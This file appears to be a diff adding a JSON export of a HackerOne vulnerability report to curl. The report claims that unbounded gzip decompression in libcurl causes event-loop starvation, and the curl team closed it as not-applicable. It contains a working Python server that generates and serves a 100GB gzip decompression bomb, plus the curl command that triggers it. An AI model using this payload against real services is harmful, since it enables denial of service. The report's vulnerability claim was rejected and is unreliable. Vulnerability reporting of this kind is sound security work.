@@ -1,0 +1,123 @@
+{
+  "id": 3632427,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjMyNDI3",
+  "url": "https://hackerone.com/reports/3632427",
+  "title": "Unbounded GZIP Decompression Leading to Event-Loop Starvation",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2026-03-27T18:01:09.090Z",
+  "submitted_at": "2026-03-27T18:01:09.591Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ok3y",
+    "url": "/ok3y",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xepvm9b3jhi47gof6b36x8ow3kcw/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-03-31T05:51:39.603Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-03-29T16:44:49.427Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When libcurl is configured to decompress HTTP responses (via `CURLOPT_ACCEPT_ENCODING` or the `--compressed` CLI flag), it lacks decompression bounds checking or a mechanism to yield execution during massive expansion tasks. If an attacker provides a highly compressed payload (zip bomb), libcurl's underlying core function `inflate_stream()` in `lib/content_encoding.c` will process the decompression in an unbounded, synchronous `while(!done)` loop. \nFor backend services utilizing libcurl's non-blocking I/O interface (`curl_multi_perform`), this forces the library to synchronously decompress gigabytes or terabytes of data without yielding control back to the application's event loop. This leads to complete thread starvation and denial of service (DoS) for all other active transfers handled by that multi handle.\n\n## Summary:\nThe vulnerability resides in how libcurl handles the zlib inflate loop. The loop iterates synchronously until the currently buffered encoded chunk is fully decompressed. An attacker can stream a 100 MB highly compressed payload that mathematically expands to 100 Gigabytes or even Terabytes natively. Because libcurl enforces zero limits on the decompression ratio (nor does it pause to return control to the caller during massive Z_OK iterations), the CPU core running the multi interface becomes 100% blocked. This is highly disruptive for microservices, webhooks, or automated systems leveraging libcurl under the hood with compression enabled to save bandwidth.\n[six or fewer sentences describing the issue and optionally a short proof-of-concept script]\n\n## Affected version\ncurl 8.19.0 (x86_64-pc-linux-gnu) libcurl/8.19.0\n\n## Steps To Reproduce:\nTo cleanly demonstrate the severity within the context of CPU starvation (and avoid simply filling a disk), i provide a self-contained PoC generating a 100GB decompression bomb dynamically. In a real-world scenario targeting a backend service, the application's thread will freeze entirely.\n\n### Step 1: Save the Malicious Server Script\nSave the following python script as `server_bomb.py`. This script dynamically generates a custom gzip payload engineered to expand to exactly 100 Gigabytes of zeros.\n\n```python\n#!/usr/bin/env python3\nimport gzip\nimport io\nimport sys\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nprint(\"[*] Generating 100GB decompression bomb...\")\n\n# Generate a highly compressed 100GB payload in memory\nbuf = io.BytesIO()\nwith gzip.GzipFile(fileobj=buf, mode='wb', compresslevel=9) as f:\n    chunk = b'0' * (1024 * 1024) # 1 MB of zeros\n    for _ in range(100 * 1024):  # Write 102,400 times (100 GB total)\n        f.write(chunk)\n\nBOMB_DATA = buf.getvalue()\n\nclass MaliciousServer(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/octet-stream')\n        self.send_header('Content-Encoding', 'gzip') \n        self.send_header('Content-Length', str(len(BOMB_DATA)))\n        self.end_headers()\n        self.wfile.write(BOMB_DATA)\n        print(f\"[!] Victim requested {self.path}. 100GB Payload delivered!\")\n\n    def log_message(self, format, *args):\n        pass\n\nif __name__ == '__main__':\n    host, port = '127.0.0.1', 8080\n    print(f\"\\n[*] Malicious Server running at: http://{host}:{port}/\")\n    try:\n        HTTPServer((host, port), MaliciousServer).serve_forever()\n    except KeyboardInterrupt:\n        sys.exit(0)\n```\n\n### Step 2: Start the Malicious Server\n```bash\npython3 server_bomb.py\n```\n\n### Step 3: Trigger the Vulnerability with Curl\nTo simulate a libcurl application fetching the payload and discarding it (or piping it to a null sink), we use the CLI. We time the operation to demonstrate the CPU lock.\n```bash\ntime curl --compressed http://127.0.0.1:8080/ -o /dev/null\n```\n\n### Step 4: Validate the Impact\nDespite transferring a very small payload over the network loopback, the curl process immediately locks the CPU core at 100% utilization. A typical CLI user may easily interrupt this, but a backend application process executing `curl_multi_perform` will be completely deadlocked. The thread will spend minutes (or hours if scaled to Terabytes) exclusively in user-space CPU executing zlib routines.\n\n### Deeper Code-Level Analysis (Cause and Effect)\nThe root issue exists in `lib/content_encoding.c` within the `inflate_stream()` handler:\n```c\n  /* Because the buffer size is fixed, iteratively decompress and transfer to\n     the client via next_write function. */\n  while(!done) {\n    z->next_out = (Bytef *)zp->buffer;\n    z->avail_out = DECOMPRESS_BUFFER_SIZE; /* rigidly set to 16KB */\n\n    status = inflate(z, Z_BLOCK);\n\n    if(z->avail_out != DECOMPRESS_BUFFER_SIZE) {\n      if(status == Z_OK || status == Z_STREAM_END) {\n        result = Curl_cwriter_write(data, writer->next, type, zp->buffer,\n                                    DECOMPRESS_BUFFER_SIZE - z->avail_out);\n...\n```\n**Cause and Effect:**\nThe `while(!done)` loop executes continuously as long as `inflate()` returns `Z_OK` for the provided input chunk. Because `z->avail_out` is statically constrained to 16 KB, expanding a 100 GB payload forces `libcurl` to natively execute 6,553,600 consecutive loop iterations block-by-block. \nCrucially, libcurl does not yield back to the application's event loop during this expansion. It violates the promise of non-blocking I/O for `multi` handles, as the execution thread is hijacked purely by CPU decompression tasks.\n\n## Impact\n\nWhat security impact can an attacker achieve?\nAn attacker can orchestrate a targeted denial of service (DoS) against backend services, automated crawlers, webhooks, or headless systems integrating libcurl with `CURLOPT_ACCEPT_ENCODING` enabled. \n\n## Summary:\nThe primary threat is CPU Starvation / Thread Blocking in backend applications.\n- **Event-Loop Blockade in libcurl integrations:** Applications using the non-blocking `multi` interface will freeze. A single maliciously crafted URL blocks the main dispatch thread indefinitely, starving all other concurrent network operations handled by that instance.\n- **Realistic Threat Model:** While a CLI user fetching a file will merely experience a hanging terminal (easily breakable), backend microservices fetching external avatars, RSS feeds, or webhook endpoints with compression enabled (a standard practice to save bandwidth) will suffer total worker node exhaustion.",
+  "weakness": {
+    "id": 109,
+    "name": "Improper Handling of Highly Compressed Data (Data Amplification)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "2026",
+    "dpixls",
+    "vuln4n6",
+    "aravithapa",
+    "pwnm4n",
+    "strangehacks",
+    "virto",
+    "wildercode20",
+    "dademurphy7331",
+    "colinc",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
